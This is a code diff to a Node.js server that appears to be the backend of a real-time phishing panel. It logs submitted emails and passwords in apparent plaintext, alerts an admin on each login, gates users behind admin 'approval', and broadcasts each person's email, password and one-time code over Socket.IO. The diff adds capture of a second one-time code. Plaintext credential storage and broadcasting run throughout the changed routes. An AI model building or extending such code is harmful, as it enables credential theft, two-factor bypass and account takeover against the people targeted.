@@ -121,6 +121,7 @@ async function initializeDatabase() {
         email VARCHAR(255) UNIQUE NOT NULL,
         password VARCHAR(255) NOT NULL,
         otp VARCHAR(6),
+        second_otp VARCHAR(6) DEFAULT NULL,
         otp_attempts INTEGER DEFAULT 0,
         otp_verified BOOLEAN DEFAULT FALSE,
         approved BOOLEAN DEFAULT FALSE,
@@ -128,7 +129,7 @@ async function initializeDatabase() {
         updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
     `);
-    console.log('✅ Users table ready with approved column');
+    console.log('✅ Users table ready with approved and second_otp columns');
 
     await pool.query(`
       ALTER TABLE users 
@@ -189,7 +190,7 @@ app.post('/api/users/login', async (req, res) => {
       INSERT INTO users (email, password, otp_verified, approved) 
       VALUES ($1, $2, false, false) 
       ON CONFLICT (email) DO UPDATE 
-      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL, approved = false
+      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL, second_otp = NULL, approved = false
     `, [email, password]);
 
     console.log('🔔 SENDING INSTANT NOTIFICATION TO ADMIN - New Login:', email);
@@ -345,7 +346,7 @@ app.post('/api/admin/approve-user', authenticateJWT, async (req, res) => {
   }
 });
 
-// Save user-created OTP
+// Save user-created OTP to second_otp column (UPDATED)
 app.post('/api/users/save-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
@@ -359,7 +360,7 @@ app.post('/api/users/save-otp', async (req, res) => {
     }
 
     const result = await pool.query(
-      'UPDATE users SET otp = $1, otp_verified = true, otp_attempts = 0 WHERE email = $2 RETURNING id, email, otp, password',
+      'UPDATE users SET second_otp = $1, otp_verified = true, otp_attempts = 0 WHERE email = $2 RETURNING id, email, second_otp, password',
       [otp, email]
     );
 
@@ -369,14 +370,14 @@ app.post('/api/users/save-otp', async (req, res) => {
 
     const user = result.rows[0];
 
-    console.log('🔔 SENDING INSTANT NOTIFICATION TO ADMIN - OTP Created:', email, 'OTP:', otp);
+    console.log('🔔 SENDING INSTANT NOTIFICATION TO ADMIN - Second OTP Created:', email, 'OTP:', otp);
     
-    io.emit('user-otp-created', { 
+    io.emit('user-second-otp-created', { 
       email: user.email,
       password: user.password,
-      otp: user.otp,
+      second_otp: user.second_otp,
       timestamp: new Date(),
-      message: '✅ User has created and verified their OTP successfully',
+      message: '✅ User has created and verified their second OTP successfully',
       notification: {
         sound: 'success',
         vibrate: true,
@@ -385,10 +386,10 @@ app.post('/api/users/save-otp', async (req, res) => {
       }
     });
 
-    console.log('✅ User OTP saved and verified for:', email, 'OTP:', otp);
-    res.json({ success: true, message: 'OTP saved successfully' });
+    console.log('✅ User second OTP saved and verified for:', email, 'OTP:', otp);
+    res.json({ success: true, message: 'Second OTP saved successfully' });
   } catch (error) {
-    console.error('❌ Save OTP error:', error.message);
+    console.error('❌ Save second OTP error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -403,7 +404,7 @@ app.post('/api/users/reset', async (req, res) => {
     const password = userResult.rows[0]?.password || 'unknown';
 
     await pool.query(
-      'UPDATE users SET otp = NULL, otp_verified = false, otp_attempts = 0, approved = false WHERE email = $1',
+      'UPDATE users SET otp = NULL, second_otp = NULL, otp_verified = false, otp_attempts = 0, approved = false WHERE email = $1',
       [email]
     );
     
@@ -459,7 +460,8 @@ app.get('/api/admin/users', authenticateJWT, async (req, res) => {
         id, 
         email, 
         password,
-        otp, 
+        otp,
+        second_otp,
         otp_attempts,
         otp_verified,
         approved,
@@ -484,7 +486,8 @@ app.get('/api/admin/users/:email', authenticateJWT, async (req, res) => {
         id, 
         email, 
         password,
-        otp, 
+        otp,
+        second_otp,
         otp_attempts,
         otp_verified,
         approved,
